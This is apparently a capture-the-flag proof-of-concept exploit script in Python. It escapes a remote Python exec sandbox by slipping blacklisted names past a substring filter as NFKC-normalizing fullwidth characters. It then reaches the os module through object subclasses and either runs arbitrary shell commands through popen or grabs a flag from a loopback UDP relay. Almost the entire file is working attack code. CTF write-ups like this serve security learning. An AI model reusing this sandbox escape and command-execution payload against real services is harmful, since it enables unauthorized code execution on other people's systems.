#!/usr/bin/env python3
"""The Fire-Control Terminal (Operation Dawn) - proof of concept.

Summary: a Python exec console with empty builtins and a raw-substring
blacklist; NFKC-normalizing fullwidth identifiers bypass the filter, and
a loopback UDP relay broadcasts the flag one second at a time.

Usage: op_dawn.py HOST PORT [--cmd 'id']

Without --cmd the PoC binds 127.0.0.1:49513 (the relay port nobody else
listens on), captures the standing-order datagram, and decodes the
base64url auth code. With --cmd it runs a command through the documented
popen/read path instead. The CTF instance is retired; this PoC documents
the exploit path.
"""

import base64
import json
import socket
import sys

RELAY_PORT = 49513  # loopback UDP port the relay sends to; free for the taking


def fullwidth(token):
    """Map printable ASCII to fullwidth forms; the tokenizer NFKC-normalizes."""
    return "".join(chr(ord(c) + 0xFEE0) if 0x21 <= ord(c) <= 0x7E else c for c in token)


FW_CLASS = fullwidth("class")
FW_BASES = fullwidth("bases")
FW_SUBCLASSES = fullwidth("subclasses")
FW_GLOBALS = fullwidth("globals")
FW_READ = fullwidth("read")

# _wrap_close.__init__.__globals__ is the os module namespace (also exposes sys).
BUILD_G = (
    "G=[c for c in ().__{cls}__.__{bases}__[0].__{subs}__() "
    "if c.__name__=='_wrap_close'][0].__init__.__{glob}__"
).format(cls=FW_CLASS, bases=FW_BASES, subs=FW_SUBCLASSES, glob=FW_GLOBALS)

BIND_RELAY = [
    "S=G['sys'].modules['socket']",
    "s=S.socket(S.AF_INET,S.SOCK_DGRAM)",
    f"s.bind(('127.0.0.1',{RELAY_PORT}))",
    "d=s.recvfrom(65535)[0]",
    "G['write'](1,d)",
]


def recv_until(sock, marker, timeout=15):
    sock.settimeout(timeout)
    data = b""
    try:
        while marker not in data:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data


def send_line(sock, line):
    sock.sendall(line.encode() + b"\n")


def main():
    if len(sys.argv) < 3:
        print(f"usage: {sys.argv[0]} HOST PORT [--cmd 'id']", file=sys.stderr)
        raise SystemExit(2)
    host, port = sys.argv[1], int(sys.argv[2])
    cmd = sys.argv[sys.argv.index("--cmd") + 1] if "--cmd" in sys.argv else None

    with socket.create_connection((host, port), timeout=10) as sock:
        banner = recv_until(sock, b">>>", timeout=5)
        sys.stdout.buffer.write(banner)

        send_line(sock, BUILD_G)
        sys.stdout.buffer.write(recv_until(sock, b">>>", timeout=5))

        if cmd:
            # popen/read are blacklisted substrings; split and fullwidth them.
            send_line(sock, "G['write'](1,G['pop'+'en']({!s}).{!s}().encode())".format(
                json.dumps(cmd), FW_READ))
            out = recv_until(sock, b">>>", timeout=10)
            sys.stdout.buffer.write(out)
            return

        captured = b""
        for line in BIND_RELAY:
            send_line(sock, line)
            # recvfrom blocks until the next relay tick (~1s).
            out = recv_until(sock, b">>>", timeout=20)
            sys.stdout.buffer.write(out)
            captured += out

        marker = captured.find(b"AUTH CODE ")
        if marker < 0:
            print("\n[!] relay datagram not captured; see raw output above", file=sys.stderr)
            raise SystemExit(1)
        token = captured[marker + len(b"AUTH CODE "):].split()[0]
        decoded = base64.urlsafe_b64decode(token + b"=" * (-len(token) % 4))
        print(f"\n[+] decoded auth code: {decoded.decode('utf-8', errors='replace')}")


if __name__ == "__main__":
    main()
